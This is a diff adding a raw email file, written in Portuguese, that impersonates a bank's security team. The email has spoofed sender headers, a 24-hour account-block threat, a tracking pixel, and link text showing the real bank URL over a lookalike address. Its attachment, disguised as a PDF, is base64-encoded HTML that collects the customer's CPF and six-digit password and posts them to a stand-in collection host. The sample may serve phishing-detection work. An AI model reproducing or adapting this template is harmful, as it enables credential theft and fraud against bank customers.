@@ -1,0 +1,73 @@
+Received: from mx.provedor-destino.example (mx.provedor-destino.example [203.0.113.10])
+ by mailstore.example.org with ESMTPS id ABC123
+ for <alvo@example.org>; Mon, 19 Oct 2026 03:12:50 +0000
+Received: from srv-relay-77.mailer-xyz.example (unknown [198.51.100.77])
+ by mx.provedor-destino.example with ESMTP id 9f2c4e;
+ Mon, 19 Oct 2026 03:12:47 +0000
+Received: from bancoexemplo.example (vps-4521.hosting-barato.example [192.0.2.45])
+ by srv-relay-77.mailer-xyz.example (Postfix) with ESMTPA id 1A2B3C;
+ Mon, 19 Oct 2026 03:12:44 +0000
+Authentication-Results: mx.provedor-destino.example;
+ spf=pass (sender IP is 198.51.100.77) smtp.mailfrom=bounce@mailer-xyz.example;
+ dkim=none (message not signed);
+ dmarc=fail (p=none) header.from=bancoexemplo-seguro.example
+Return-Path: <bounce@mailer-xyz.example>
+From: "Seguranca Banco Exemplo" <seguranca@bancoexemplo-seguro.example>
+Reply-To: atendimento.bancoexemplo@mail-reply.example
+To: <alvo@example.org>
+Subject: [URGENTE] Atividade suspeita detectada - confirme seus dados em 24h
+Date: Mon, 19 Oct 2026 03:12:44 +0000
+Message-ID: <20261019031244.1A2B3C@vps-4521.hosting-barato.example>
+X-Mailer: PHPMailer 5.2.0 (https://github.com/PHPMailer/PHPMailer)
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="==MIXED_BOUNDARY=="
+
+--==MIXED_BOUNDARY==
+Content-Type: multipart/alternative; boundary="==ALT_BOUNDARY=="
+
+--==ALT_BOUNDARY==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Prezado(a) cliente,
+
+Detectamos uma atividade suspeita na sua conta. Por seguranca, o acesso sera BLOQUEADO em 24 horas caso os seus dados nao sejam confirmados.
+
+Para evitar o bloqueio, acesse o link abaixo e confirme seus dados:
+https://www.bancoexemplo.com.br/seguranca
+
+Voce tambem pode preencher o formulario em anexo (Formulario_Seguranca.pdf.html).
+
+Atenciosamente,
+Equipe de Seguranca - Banco Exemplo S.A.
+CNPJ 00.000.000/0001-00
+
+--==ALT_BOUNDARY==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+<html><body style="font-family:Arial,sans-serif">
+<img src="http://track.mailer-xyz.example/o.gif?u=ALVO123" width="1" height="1" alt="">
+<p><b>Prezado(a) cliente,</b></p>
+<p>Detectamos uma <b>atividade suspeita</b> na sua conta. Por seguranca, o acesso sera <b style="color:red">BLOQUEADO em 24 horas</b> caso os seus dados nao sejam confirmados.</p>
+<p>Para evitar o bloqueio, acesse: <a href="http://bancoexemplo-seguro.example/autenticar?ref=ALVO123">https://www.bancoexemplo.com.br/seguranca</a></p>
+<p>Voce tambem pode preencher o formulario em anexo (Formulario_Seguranca.pdf.html).</p>
+<p>Atenciosamente,<br>Equipe de Seguranca - Banco Exemplo S.A.<br>CNPJ 00.000.000/0001-00</p>
+</body></html>
+
+--==ALT_BOUNDARY==--
+
+--==MIXED_BOUNDARY==
+Content-Type: text/html; name="Formulario_Seguranca.pdf.html"
+Content-Disposition: attachment; filename="Formulario_Seguranca.pdf.html"
+Content-Transfer-Encoding: base64
+
+PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0idXRmLTgiPjx0aXRsZT5Gb3JtdWxhcmlvIGRlIFNl
+Z3VyYW5jYTwvdGl0bGU+PC9oZWFkPgo8Ym9keSBzdHlsZT0iZm9udC1mYW1pbHk6QXJpYWwiPgo8
+aDM+QmFuY28gRXhlbXBsbyAtIFZhbGlkYWNhbyBkZSBTZWd1cmFuY2E8L2gzPgo8Zm9ybSBtZXRo
+b2Q9InBvc3QiIGFjdGlvbj0iaHR0cDovL2NvbGV0YS5iYW5jb2V4ZW1wbG8tc2VndXJvLmV4YW1w
+bGUvcG9zdCI+CkNQRjogPGlucHV0IG5hbWU9ImNwZiI+PGJyPgpTZW5oYSBkZSA2IGRpZ2l0b3M6
+IDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0ic2VuaGEiPjxicj4KPGlucHV0IHR5cGU9InN1
+Ym1pdCIgdmFsdWU9IlZhbGlkYXIiPgo8L2Zvcm0+CjwvYm9keT48L2h0bWw+Cg==
+
+--==MIXED_BOUNDARY==--
